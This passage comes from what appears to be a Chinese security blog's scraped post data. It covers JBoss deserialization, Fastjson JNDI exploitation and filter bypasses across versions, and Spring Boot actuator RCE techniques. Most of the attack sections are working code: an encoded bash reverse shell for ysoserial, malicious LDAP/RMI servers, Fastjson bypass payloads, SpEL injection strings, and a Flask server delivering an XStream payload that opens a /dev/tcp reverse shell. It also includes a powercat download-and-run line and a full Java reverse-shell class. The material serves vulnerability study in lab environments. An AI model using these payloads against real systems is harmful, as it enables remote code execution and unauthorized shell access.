我们使用bash来反弹shell，但由于Runtime.getRuntime().exec()中不能使用管道符等bash需要的方法，我们需要用进行一次编码。 工具：http://www.jackson-t.ca/runtime-exec-payloads.html 序列化数据生成 使用ysoserial来复现生成序列化数据，由于Vulhub使用的Java版本较新，所以选择使用的gadget是CommonsCollections5： 1java -jar ysoserial.jar CommonsCollections5 \"bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEuMTAwLzY2NjYgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125; \" &gt;poc.ser 监听端口，等待反弹 1nc -lvp 6666 发送POC 生成好的POC即为poc.ser，将这个文件作为POST Body发送至/invoker/readonly即可： 参考文章： Jboss漏洞利用总结 https://vulhub.org/","categories":[],"tags":[],"author":"ye1s"},{"title":"Fastjson漏洞分析","slug":"Fastjson漏洞分析","date":"2021-03-22T03:19:57.000Z","updated":"2021-04-09T01:18:03.299Z","comments":true,"path":"article/3e624329.html","link":"","permalink":"https://blog.cfyqy.com/article/3e624329.html","excerpt":"Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作。","text":"Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口JSON.toJSONString和JSON.parseObject/JSON.parse来分别实现序列化和反序列化操作。 Fastjson 1.2.22-1.2.24漏洞环境 运行测试环境： 1docker-compose up -d 环境运行后，访问http://your-ip:8090即可看到JSON格式的输出。 我们向这个地址POST一个JSON对象，即可更新服务端的信息： 1curl http:&#x2F;&#x2F;your-ip:8090&#x2F; -H &quot;Content-Type: application&#x2F;json&quot; --data &#39;&#123;&quot;name&quot;:&quot;hello&quot;, &quot;age&quot;:20&#125;&#39; 漏洞复现： 因为目标环境是Java 8u102，没有com.sun.jndi.rmi.object.trustURLCodebase的限制，我们可以使用com.sun.rowset.JdbcRowSetImpl的利用链，借助JNDI注入来执行命令。 起一个WEB服务器， 1python -m http.server 80 首先编译并上传命令执行代码到WEB服务中 12345678910111213141516// javac TouchFile.javaimport java.lang.Runtime;import java.lang.Process;public class TouchFile &#123; static &#123; try &#123; Runtime rt = Runtime.getRuntime(); String[] commands = &#123; \"/bin/sh\", \"-c\", \"ping -c 1 `whoami`.xxx.dnslog.cn\"&#125;; Process pc = rt.exec(commands); pc.waitFor(); &#125; catch (Exception e) &#123; // do nothing &#125; &#125;&#125; 然后我们借助marshalsec项目，启动一个RMI服务器，监听9999端口，并制定加载远程类TouchFile.class： 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer &quot;http:&#x2F;&#x2F;your-vps&#x2F;#TouchFile&quot; 9999 向靶场服务器发送Payload，带上RMI的地址： 1234567891011121314151617POST &#x2F; HTTP&#x2F;1.1Host: your-ip:8090Accept-Encoding: gzip, deflateAccept: *&#x2F;*Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)Connection: closeContent-Type: application&#x2F;jsonContent-Length: 160&#123; &quot;b&quot;:&#123; &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;, &quot;dataSourceName&quot;:&quot;rmi:&#x2F;&#x2F;your-vps:9999&#x2F;TouchFile&quot;, &quot;autoCommit&quot;:true &#125;&#125; 可见，命令已成功执行： TemplatesImpl利用链漏洞原理：Fastjson通过bytecodes字段传入恶意类，调用outputProperties属性的getter方法时，实例化传入的恶意类，调用其构造方法，造成任意命令执行。 但是由于需要在parse反序列化时设置第二个参数Feature.SupportNonPublicField，所以利用面很窄，但是这条利用链还是值得去学习详情可看 https://xz.aliyun.com/t/8979#toc-6 JdbcRowSetImpl利用链JdbcRowSetImpl利用链最终的结果是导致JNDI注入，可以使用RMI+JNDI和RMI+LDAP进行利用 RMI+JNDI编译badClassName.java文件，并起一个WEB服务放入，这里端口设置为8888badClassName.java 123456789import java.io.IOException;public class badClassName &#123; public badClassName() throws IOException &#123; Runtime.getRuntime().exec(\"calc\"); &#125;&#125; JNDIServer 123456789101112131415161718import com.sun.jndi.rmi.registry.ReferenceWrapper;import javax.naming.NamingException;import javax.naming.Reference;import java.rmi.AlreadyBoundException;import java.rmi.RemoteException;import java.rmi.registry.LocateRegistry;import java.rmi.registry.Registry;public class JNDIServer &#123; public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException &#123; Registry registry = LocateRegistry.createRegistry(1200); Reference reference = new Reference(\"calc\", \"badClassName\",\"http://127.0.0.1:8888/\"); ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference); registry.bind(\"calc\",referenceWrapper); &#125;&#125; 123456789import com.alibaba.fastjson.JSON;public class JNDIClient &#123; public static void main(String[] argv)&#123; System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\"); String payload = \"&#123;\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"rmi://127.0.0.1:1200/calc\\\", \\\"autoCommit\\\":true&#125;\"; JSON.parse(payload); &#125;&#125; LDAP+JNDI编译badClassName.java文件，并起一个WEB服务放入，这里端口设置为8888badClassName.java 123456789import java.io.IOException;public class badClassName &#123; public badClassName() throws IOException &#123; Runtime.getRuntime().exec(\"calc\"); &#125;&#125; LdapServer.java 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798import com.unboundid.ldap.listener.InMemoryDirectoryServer;import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;import com.unboundid.ldap.listener.InMemoryListenerConfig;import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;import com.unboundid.ldap.sdk.Entry;import com.unboundid.ldap.sdk.LDAPException;import com.unboundid.ldap.sdk.LDAPResult;import com.unboundid.ldap.sdk.ResultCode;import javax.net.ServerSocketFactory;import javax.net.SocketFactory;import javax.net.ssl.SSLSocketFactory;import java.net.InetAddress;import java.net.MalformedURLException;import java.net.URL; class LDAPServer &#123; private static final String LDAP_BASE = \"dc=example,dc=com\"; public static void main (String[] args) &#123; String url = \"http://127.0.0.1:8888/#badClassName\"; int port = 1389; try &#123; InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault())); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); ds.startListening(); &#125; catch ( Exception e ) &#123; e.printStackTrace(); &#125; &#125; private static class OperationInterceptor extends InMemoryOperationInterceptor &#123; private URL codebase; /** * */ public OperationInterceptor ( URL cb ) &#123; this.codebase = cb; &#125; /** * &#123;@inheritDoc&#125; * * @see com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor#processSearchResult(com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult) */ @Override public void processSearchResult ( InMemoryInterceptedSearchResult result ) &#123; String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try &#123; sendResult(result, base, e); &#125; catch ( Exception e1 ) &#123; e1.printStackTrace(); &#125; &#125; protected void sendResult ( InMemoryInterceptedSearchResult result, String base, Entry e ) throws LDAPException, MalformedURLException &#123; URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"Exploit\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf('#'); if ( refPos &gt; 0 ) &#123; cbstring = cbstring.substring(0, refPos); &#125; e.addAttribute(\"javaCodeBase\", cbstring); e.addAttribute(\"objectClass\", \"javaNamingReference\"); e.addAttribute(\"javaFactory\", this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); &#125; &#125;&#125; 客户端调用,触发恶意代码 12345678import com.alibaba.fastjson.JSON;public class Main &#123; public static void main(String[] argv)&#123; String payload = \"&#123;\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:1389/badClassName\\\", \\\"autoCommit\\\":true&#125;\"; JSON.parse(payload); &#125;&#125; checkAutotype安全机制Fastjson从1.2.25开始引入了checkAutotype安全机制，通过黑名单+白名单机制来防御。com/alibaba/fastjson/parser/ParserConfig.java 123456789101112131415int i;String deny; for(i = 0; i &lt; this.acceptList.length; ++i) &#123; deny = this.acceptList[i]; if (className.startsWith(deny)) &#123; return TypeUtils.loadClass(typeName, this.defaultClassLoader); &#125; &#125; for(i = 0; i &lt; this.denyList.length; ++i) &#123; deny = this.denyList[i]; if (className.startsWith(deny)) &#123; throw new JSONException(\"autoType is not support. \" + typeName); &#125; &#125; Fastjson 1.2.411.2.41版本漏洞利用，其实就是针对1.2.24版本漏洞所打的补丁的绕过，本次漏洞影响了1.2.41版本以及之前的版本 12345public static void main(String[] argv)&#123; ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String payload = \"&#123;\\\"@type\\\":\\\"Lcom.sun.rowset.JdbcRowSetImpl;\\\",\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:1389/badClassName\\\", \\\"autoCommit\\\":true&#125;\"; JSON.parseObject(payload); &#125; 可以发现，@type字段值为”Lcom.sun.rowset.JdbcRowSetImpl;” 在”com.sun.rowset.JdbcRowSetImpl”类的首尾多出了一个L与; 通过上文对checkAutotype安全机制的解释可以发现，@type字段值首先会经过黑白名单的校验。在成功通过校验之后，程序接下来会通过TypeUtils.loadClass方法对类进行加载 123if (clazz == null) &#123; clazz = TypeUtils.loadClass(typeName, this.defaultClassLoader, false); &#125; 进入loadClass 12345678910111213public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123; if (className != null &amp;&amp; className.length() != 0) &#123; Class&lt;?&gt; clazz = (Class)mappings.get(className); if (clazz != null) &#123; return clazz; &#125; else if (className.charAt(0) == '[') &#123; Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader); return Array.newInstance(componentType, 0).getClass(); &#125; else if (className.startsWith(\"L\") &amp;&amp; className.endsWith(\";\")) &#123; String newClassName = className.substring(1, className.length() - 1); return loadClass(newClassName, classLoader); &#125; else &#123; …… ”[”、 ”L”、”;”这些都是什么？以及为什么FastJson为什么要写两处if逻辑来处理他们。用来解析传入的数组类型的Class对象字符串(JNI字段描述符) 详情可看：https://www.anquanke.com/post/id/215753#h2-1 Fastjson 1.2.42不同于之前的版本，程序并不是直接通过明文的方式来匹配黑白名单，而是采用了一定的加密混淆。 针对这里的黑名单的原文明文也是有人曾经研究过的，可以参考如下链接 https://github.com/LeadroyaL/fastjson-blacklist 开发者的用意大概是想针对于1.2.41版本的利用”Lcom.sun.rowset.JdbcRowSetImpl;”，先剥去传入类名首尾的”L”与”;”，以便将恶意数据暴露出来，再经过黑名单校验 123456789101112public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123; if (typeName == null) &#123; return null; &#125; else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) &#123; String className = typeName.replace('$', '.'); Class&lt;?&gt; clazz = null; long BASIC = -3750763034362895579L; long PRIME = 1099511628211L; if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) &#123; className = className.substring(1, className.length() - 1); &#125;…… 绕过 12345public static void main(String[] argv)&#123; ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String payload = \"&#123;\\\"@type\\\":\\\"Lcom.sun.rowset.JdbcRowSetImpl;;\\\",\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:1389/badClassName\\\", \\\"autoCommit\\\":true&#125;\"; JSON.parseObject(payload);&#125; Fastjson 1.2.45在Fastjson 1.2.45版本中，checkAutotype安全机制又被发现了一种绕过方式。 之前的几次绕过都是针对checkAutoType的绕过，而这次则是利用了一条黑名单中不包含的元素，从而绕过了黑名单限制。 本次绕过利用到的是mybatis库。如果想测试成功，需要额外安装mybatis库。pom.xml 12345&lt;dependency&gt; &lt;groupId&gt;org.mybatis&lt;/groupId&gt; &lt;artifactId&gt;mybatis&lt;/artifactId&gt; &lt;version&gt;3.5.2&lt;/version&gt; &lt;/dependency&gt; 利用poc如下 12345public static void main(String[] argv)&#123; ParserConfig.getGlobalInstance().setAutoTypeSupport(true); String payload = \"&#123;\\\"@type\\\":\\\"org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\\\",\\\"properties\\\":&#123;\\\"data_source\\\":\\\"ldap://127.0.0.1:1389/badClassName\\\"&#125;&#125;\"; JSON.parseObject(payload);&#125; Fastjson 1.2.47Fastjson 1.2.47版本漏洞与上篇文章中介绍的几处漏洞在原理上有着很大的不同。与Fastjson历史上存在的大多数漏洞不同的是，Fastjson 1.2.47版本的漏洞利用在AutoTypeSupport功能未开启时进行。 poc 123456public static void main(String[] args) &#123; String payload = \"&#123;\\\"a\\\":&#123;\\\"@type\\\":\\\"java.lang.Class\\\",\\\"val\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\"&#125;,\" + \"\\\"b\\\":&#123;\\\"@type\\\":\\\"com.sun.rowset.JdbcRowSetImpl\\\",\\\"dataSourceName\\\":\\\"ldap://127.0.0.1:1389/badClassName\\\",\\\"autoCommit\\\":true&#125;&#125;\"; Object obj = JSON.parseObject(payload); System.out.println(obj); &#125; 1234567891011&#123; \"a\":&#123; \"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\" &#125;, \"b\":&#123; \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"rmi://192.168.1.100:9999/TouchFile\", \"autoCommit\":true &#125;&#125; 不开启autotype 参考文章：https://www.kumamon.fun/fastjsonsecurity1/https://vulhub.org/#/environments/fastjson/1.2.24-rce/https://xz.aliyun.com/t/8979Fastjson 1.2.24反序列化漏洞深度分析:http://blog.topsec.com.cn/fastjson-1-2-24%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e6%b7%b1%e5%ba%a6%e5%88%86%e6%9e%90/Fastjson历史漏洞研究（一）: https://www.anquanke.com/post/id/215753FastJson历史漏洞研究（二）:https://www.anquanke.com/post/id/218268","categories":[],"tags":[],"author":"ye1s"},{"title":"springboot相关漏洞学习","slug":"springboot相关漏洞学习","date":"2021-03-10T09:06:15.000Z","updated":"2021-03-22T03:12:18.178Z","comments":true,"path":"article/58fb41be.html","link":"","permalink":"https://blog.cfyqy.com/article/58fb41be.html","excerpt":"springboot相关漏洞学习 转载https://github.com/LandGrey/SpringBootVulExploit","text":"springboot相关漏洞学习 转载https://github.com/LandGrey/SpringBootVulExploit 信息泄露路由地址及接口调用详情泄漏开发环境切换为线上生产环境时，相关人员没有更改配置文件或忘记切换配置环境，导致此漏洞 直接访问以下几个路由，验证漏洞是否存在： 123/api-docs/v2/api-docs/swagger-ui.html 除此之外，下面的路由有时也会包含(或推测出)一些接口地址信息，但是无法获得参数相关信息： 12345678/mappings/actuator/mappings/metrics/actuator/metrics/beans/actuator/beans/configprops/actuator/configprops 一般来讲，知道 spring boot 应用的相关接口和传参信息并不能算是漏洞； 但是可以检查暴露的接口是否存在未授权访问、越权或者其他业务型漏洞。 配置不当而暴露的路由主要是因为程序员开发时没有意识到暴露路由可能会造成安全风险，或者没有按照标准流程开发，忘记上线时需要修改/切换生产环境的配置其中对寻找漏洞比较重要接口的有： 123456789&#x2F;env、&#x2F;actuator&#x2F;envGET 请求 &#x2F;env 会泄露环境变量信息，或者配置中的一些用户名，当程序员的属性名命名不规范 (例如 password 写成 psasword、pwd) 时，会泄露密码明文；同时有一定概率可以通过 POST 请求 &#x2F;env 接口设置一些属性，触发相关 RCE 漏洞。&#x2F;jolokia通过 &#x2F;jolokia&#x2F;list 接口寻找可以利用的 MBean，触发相关 RCE 漏洞；&#x2F;trace一些 http 请求包访问跟踪信息，有可能发现有效的 cookie 信息 获取被星号脱敏的密码的明文访问 /env 接口时，spring actuator 会将一些带有敏感关键词(如 password、secret)的属性名对应的属性值用 * 号替换达到脱敏的效果 详情可看：https://github.com/LandGrey/SpringBootVulExploit#0x03%E8%8E%B7%E5%8F%96%E8%A2%AB%E6%98%9F%E5%8F%B7%E8%84%B1%E6%95%8F%E7%9A%84%E5%AF%86%E7%A0%81%E7%9A%84%E6%98%8E%E6%96%87-%E6%96%B9%E6%B3%95%E4%B8%80 RCEwhitelabel error page SpEL RCESPEL详细介绍文章:由浅入深SpEL表达式注入漏洞有趣的SpEL注入 利用条件： spring boot 1.1.0-1.1.12、1.2.0-1.2.7、1.3.0 至少知道一个触发 springboot 默认错误页面的接口及参数名 利用方法： 步骤一：找到一个正常传参处比如发现访问 /article?id=xxx ，页面会报状态码为 500 的错误： Whitelabel Error Page，则后续 payload 都将会在参数 id 处尝试。 步骤二：执行 SpEL 表达式输入/article?id=${7*7} ，如果发现报错页面将7*7的值 49 计算出来显示在报错页面上，那么基本可以确定目标存在 SpEL 表达式注入漏洞。 由字符串格式转换成 0x** java 字节形式，方便执行任意代码： 1234567# coding: utf-8result = \"\"target = 'open -a Calculator'for x in target: result += hex(ord(x)) + \",\"print(result.rstrip(',')) 执行 calc 命令 1article?id=$&#123;T(java.lang.Runtime).getRuntime().exec(new String(new byte[]&#123;0x63,0x61,0x6c,0x63&#125;))&#125; 漏洞原理： spring boot 处理参数值出错，流程进入 org.springframework.util.PropertyPlaceholderHelper 类中 此时 URL 中的参数值会用 parseStringValue 方法进行递归解析 其中 ${} 包围的内容都会被 org.springframework.boot.autoconfigure.web.ErrorMvcAutoConfiguration 类的 resolvePlaceholder 方法当作 SpEL 表达式被解析执行，造成 RCE 漏洞 spring cloud SnakeYAML RCE利用条件： 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标依赖的 spring-cloud-starter 版本 &lt; 1.3.0.RELEASE 目标可以请求攻击者的 HTTP 服务器（请求可出外网） 利用方法：步骤一： 托管 yml 和 jar 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443） 1234# 使用 python 快速开启 http serverpython2 -m SimpleHTTPServer 80python3 -m http.server 80 在网站根目录下放置后缀为 yml 的文件 example.yml，内容如下： 12345!!javax.script.ScriptEngineManager [ !!java.net.URLClassLoader [[ !!java.net.URL [&quot;http:&#x2F;&#x2F;artsploit.com&#x2F;yaml-payload.jar&quot;] ]]] 在网站根目录下放置后缀为 jar 的文件 yaml-payload.jar，内容是要执行的代码，代码编写及编译方式参考 yaml-payload 步骤二： 设置 spring.cloud.bootstrap.location 属性spring 1.x 1234POST &#x2F;envContent-Type: application&#x2F;x-www-form-urlencodedspring.cloud.bootstrap.location&#x3D;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.yml spring 2.x 1234POST &#x2F;actuator&#x2F;envContent-Type: application&#x2F;json&#123;&quot;name&quot;:&quot;spring.cloud.bootstrap.location&quot;,&quot;value&quot;:&quot;http:&#x2F;&#x2F;your-vps-ip&#x2F;example.yml&quot;&#125; 步骤三： 刷新配置spring 1.x 12POST &#x2F;refreshContent-Type: application&#x2F;x-www-form-urlencoded spring 2.x 12POST &#x2F;actuator&#x2F;refreshContent-Type: application&#x2F;json 漏洞原理： spring.cloud.bootstrap.location 属性被设置为外部恶意 yml 文件 URL 地址 refresh 触发目标机器请求远程 HTTP 服务器上的 yml 文件，获得其内容 SnakeYAML 由于存在反序列化漏洞，所以解析恶意 yml 内容时会完成指定的动作 先是触发 java.net.URL 去拉取远程 HTTP 服务器上的恶意 jar 文件 然后是寻找 jar 文件中实现 javax.script.ScriptEngineFactory 接口的类并实例化 实例化类时执行恶意代码，造成 RCE 漏洞 漏洞分析：Exploit Spring Boot Actuator 之 Spring Cloud Env 学习笔记Java SnakeYaml反序列化 漏洞分析：SpringBoot SpEL表达式注入漏洞-分析与复现 eureka xstream deserialization RCE利用条件： 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标使用的 eureka-client &lt; 1.8.7（通常包含在 spring-cloud-starter-netflix-eureka-client 依赖中） 目标可以请求攻击者的 HTTP 服务器（请求可出外网） 利用方法：步骤一：架设响应恶意 XStream payload 的网站使用python3环境运行下边这个脚本（flsak_eureka.py）架设恶意网站。并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162# -*- coding: utf-8 -*-# @Time : 2019/3/12 10:06# @Author : j1anFen# @Site :# @File : run.py# linux反弹shell bash -i &gt;&amp;amp; /dev/tcp/192.168.20.82/9999 0&gt;&amp;amp;1# windows反弹shell# &lt;string&gt;powershell&lt;/string&gt;# &lt;string&gt;IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');&lt;/string&gt;# &lt;string&gt;powercat -c 192.168.123.1 -p 2333 -e cmd&lt;/string&gt;from flask import Flask, Responseapp = Flask(__name__)@app.route('/', defaults=&#123;'path': ''&#125;)@app.route('/&lt;path:path&gt;', methods = ['GET', 'POST'])def catch_all(path): xml = \"\"\"&lt;linked-hash-set&gt; &lt;jdk.nashorn.internal.objects.NativeString&gt; &lt;value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"&gt; &lt;dataHandler&gt; &lt;dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"&gt; &lt;is class=\"javax.crypto.CipherInputStream\"&gt; &lt;cipher class=\"javax.crypto.NullCipher\"&gt; &lt;serviceIterator class=\"javax.imageio.spi.FilterIterator\"&gt; &lt;iter class=\"javax.imageio.spi.FilterIterator\"&gt; &lt;iter class=\"java.util.Collections$EmptyIterator\"/&gt; &lt;next class=\"java.lang.ProcessBuilder\"&gt; &lt;command&gt; &lt;string&gt;/bin/bash&lt;/string&gt; &lt;string&gt;-c&lt;/string&gt; &lt;string&gt;bash -i &gt;&amp;amp; /dev/tcp/88.88.88.88/3333 0&gt;&amp;amp;1&lt;/string&gt; &lt;/command&gt; &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt; &lt;/next&gt; &lt;/iter&gt; &lt;filter class=\"javax.imageio.ImageIO$ContainsFilter\"&gt; &lt;method&gt; &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt; &lt;name&gt;start&lt;/name&gt; &lt;parameter-types/&gt; &lt;/method&gt; &lt;name&gt;foo&lt;/name&gt; &lt;/filter&gt; &lt;next class=\"string\"&gt;foo&lt;/next&gt; &lt;/serviceIterator&gt; &lt;lock/&gt; &lt;/cipher&gt; &lt;input class=\"java.lang.ProcessBuilder$NullInputStream\"/&gt; &lt;ibuffer&gt;&lt;/ibuffer&gt; &lt;/is&gt; &lt;/dataSource&gt; &lt;/dataHandler&gt; &lt;/value&gt; &lt;/jdk.nashorn.internal.objects.NativeString&gt;&lt;/linked-hash-set&gt;\"\"\" return Response(xml, mimetype='application/xml')if __name__ == \"__main__\": app.run(host='0.0.0.0', port=2222) 步骤二：监听反弹 shell 的端口一般使用 nc 监听端口，等待反弹 shell 1nc -lvp 3333 步骤三：设置 eureka.client.serviceUrl.defaultZone 属性spring 1.x 1234POST /envContent-Type: application/x-www-form-urlencodedeureka.client.serviceUrl.defaultZone=http://your-vps-ip/example spring 2.x 1234POST /actuator/envContent-Type: application/json&#123;\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://your-vps-ip/example\"&#125; 步骤四：刷新配置spring 1.x 12POST /refreshContent-Type: application/x-www-form-urlencoded spring 2.x 12POST /actuator/refreshContent-Type: application/json 漏洞分析：Spring Boot Actuator从未授权访问到getshell jolokia logback JNDI RCE利用条件： 目标网站存在 /jolokia 或 /actuator/jolokia 接口 目标使用了 jolokia-core 依赖（版本要求暂未知）并且环境中存在相关 MBean 目标可以请求攻击者的 HTTP 服务器（请求可出外网） JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201/7u191/8u182/11.0.1（LDAP 方式） 利用方法：步骤一：查看已存在的 MBeans访问 /jolokia/list 接口，查看是否存在 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL 关键词。 步骤二：托管 xml 文件在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443） 1234# 使用 python 快速开启 http serverpython2 -m SimpleHTTPServer 80python3 -m http.server 80 在根目录放置以 xml 结尾的 example.xml 文件，内容如下： 123&lt;configuration&gt; &lt;insertFromJNDI env-entry-name=\"ldap://your-vps-ip:1389/JNDIObject\" as=\"appName\" /&gt;&lt;/configuration&gt; 步骤三：准备要执行的 Java 代码编写优化过后的用来反弹 shell 的 Java 示例代码 JNDIObject.java， 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576/** * javac -source 1.5 -target 1.5 JNDIObject.java * * Build By LandGrey * */import java.io.File;import java.io.InputStream;import java.io.OutputStream;import java.net.Socket;public class JNDIObject &#123; static &#123; try&#123; String ip = \"your-vps-ip\"; String port = \"443\"; String py_path = null; String[] cmd; if (!System.getProperty(\"os.name\").toLowerCase().contains(\"windows\")) &#123; String[] py_envs = new String[]&#123;\"/bin/python\", \"/bin/python3\", \"/usr/bin/python\", \"/usr/bin/python3\", \"/usr/local/bin/python\", \"/usr/local/bin/python3\"&#125;; for(int i = 0; i &lt; py_envs.length; ++i) &#123; String py = py_envs[i]; if ((new File(py)).exists()) &#123; py_path = py; break; &#125; &#125; if (py_path != null) &#123; if ((new File(\"/bin/bash\")).exists()) &#123; cmd = new String[]&#123;py_path, \"-c\", \"import pty;pty.spawn(\\\"/bin/bash\\\")\"&#125;; &#125; else &#123; cmd = new String[]&#123;py_path, \"-c\", \"import pty;pty.spawn(\\\"/bin/sh\\\")\"&#125;; &#125; &#125; else &#123; if ((new File(\"/bin/bash\")).exists()) &#123; cmd = new String[]&#123;\"/bin/bash\"&#125;; &#125; else &#123; cmd = new String[]&#123;\"/bin/sh\"&#125;; &#125; &#125; &#125; else &#123; cmd = new String[]&#123;\"cmd.exe\"&#125;; &#125; Process p = (new ProcessBuilder(cmd)).redirectErrorStream(true).start(); Socket s = new Socket(ip, Integer.parseInt(port)); InputStream pi = p.getInputStream(); InputStream pe = p.getErrorStream(); InputStream si = s.getInputStream(); OutputStream po = p.getOutputStream(); OutputStream so = s.getOutputStream(); while(!s.isClosed()) &#123; while(pi.available() &gt; 0) &#123; so.write(pi.read()); &#125; while(pe.available() &gt; 0) &#123; so.write(pe.read()); &#125; while(si.available() &gt; 0) &#123; po.write(si.read()); &#125; so.flush(); po.flush(); Thread.sleep(50L); try &#123; p.exitValue(); break; &#125; catch (Exception e) &#123; &#125; &#125; p.destroy(); s.close(); &#125;catch (Throwable e)&#123; e.printStackTrace(); &#125; &#125;&#125; 使用兼容低版本 jdk 的方式编译： 12345678910javac -source 1.5 -target 1.5 JNDIObject.java``` 然后将生成的 JNDIObject.class 文件拷贝到 步骤二 中的网站根目录。步骤四：架设恶意 ldap 服务下载 [marshalsec](https://github.com/mbechler/marshalsec/releases) ，```bashmvn clean package -DskipTests 使用下面命令架设对应的 ldap 服务： 1java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389 步骤五：监听反弹 shell 的端口一般使用 nc 监听端口，等待反弹 shell 1nc -lv 443 步骤六：从外部 URL 地址加载日志配置文件⚠️ 如果目标成功请求了example.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。 替换实际的 your-vps-ip 地址访问 URL 触发漏洞： 1/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/example.xml 漏洞原理： 直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 ch.qos.logback.classic.jmx.JMXConfigurator 类的 reloadByURL 方法 目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容 目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞) xml 文件中利用 logback 依赖的 insertFormJNDI 标签，设置了外部 JNDI 服务器地址 目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞 漏洞分析： spring boot actuator rce via jolokia jolokia Realm JNDI RCE利用条件： 目标网站存在 /jolokia 或 /actuator/jolokia 接口 目标使用了 jolokia-core 依赖（版本要求暂未知）并且环境中存在相关 MBean 目标可以请求攻击者的服务器（请求可出外网） 普通 JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u141/7u131/8u121(RMI)，但相关环境可绕过 利用方法：步骤一：查看已存在的 MBeans访问 /jolokia/list 接口，查看是否存在 type=MBeanFactory 和 createJNDIRealm 关键词。 步骤二：准备要执行的 Java 代码编写优化过后的用来反弹 shell 的 Java 示例代码 JNDIObject.java。 步骤三：托管 class 文件在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443） 1234# 